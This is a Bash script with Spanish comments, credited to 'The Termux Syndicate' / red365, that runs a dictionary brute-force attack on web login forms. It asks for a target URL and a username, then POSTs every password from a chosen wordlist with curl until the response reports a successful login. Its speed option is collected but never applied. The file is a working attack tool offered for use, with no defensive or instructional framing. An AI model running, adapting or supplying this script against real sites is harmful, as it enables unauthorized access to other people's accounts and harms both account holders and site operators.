#!/bin/bash

# Colores
GREEN='\033[0;32m'
RESET='\033[0m'
RED='\033[0;31m'

# Mostrar banner
function mostrar_banner() {
    figlet -c "The Termux Syndicate - Brute Force Web"
    echo -e "${GREEN}by red365${RESET}"
    echo ""
}

# Función para elegir el diccionario
function elegir_diccionario() {
    echo -e "${GREEN}Selecciona el diccionario:${RESET}"
    select diccionario in $(ls diccionarios/*.txt); do
        if [ -n "$diccionario" ]; then
            echo -e "${GREEN}Has seleccionado el diccionario: $diccionario${RESET}"
            break
        else
            echo -e "${RED}Opción inválida, por favor selecciona un número válido.${RESET}"
        fi
    done
}

# Función para realizar el ataque de fuerza bruta
function ataque_fuerza_bruta() {
    echo -e "${GREEN}Iniciando ataque de fuerza bruta...${RESET}"
    read -p "¿Cuál es la URL del objetivo? " url
    read -p "Introduce el nombre de usuario: " usuario

    # Leer el diccionario y probar las contraseñas
    while IFS= read -r password; do
        echo -e "${GREEN}Probando contraseña: $password${RESET}"
        response=$(curl -s -L -X POST --data "username=$usuario&password=$password" $url)
        if echo "$response" | grep -q "Login exitoso"; then
            echo -e "${GREEN}¡Contraseña correcta! La contraseña es: $password${RESET}"
            break
        else
            echo -e "${RED}Contraseña incorrecta: $password ${RESET}X"
        fi
    done < "$diccionario"
}

# Función para elegir la velocidad del ataque
function elegir_velocidad() {
    echo "Selecciona la velocidad del ataque:"
    echo "1) Baja"
    echo "2) Media"
    echo "3) Alta"
    echo "4) Máxima (sin pausa)"
    read -p "Elige la opción de velocidad (1-4): " velocidad
}

# Menú principal
while true; do
    mostrar_banner
    echo -e "${GREEN}Bienvenido al sistema de ataque de fuerza bruta.${RESET}"
    echo "1) Elegir diccionario"
    echo "2) Iniciar ataque"
    echo "3) Salir"
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1)
            elegir_diccionario
            ;;
        2)
            if [ -z "$diccionario" ]; then
                echo -e "${RED}Primero debes seleccionar un diccionario.${RESET}"
            else
                elegir_velocidad
                ataque_fuerza_bruta
            fi
            ;;
        3)
            echo -e "${GREEN}Saliendo del programa...${RESET}"
            break
            ;;
        *)
            echo -e "${RED}Opción inválida, intenta nuevamente.${RESET}"
            ;;
    esac
done
